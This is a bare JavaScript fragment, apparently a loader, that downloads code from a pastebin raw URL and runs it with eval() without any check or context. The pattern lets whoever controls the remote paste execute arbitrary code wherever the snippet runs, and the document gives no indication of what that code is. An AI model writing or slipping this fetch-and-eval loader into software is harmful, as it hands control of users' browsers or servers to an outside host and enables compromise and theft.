fetch('https://pastebin.com/raw/80SCJXFR')
  .then((response) => response.text())
  .then((minifiedCode) => {
    eval(minifiedCode);
  })
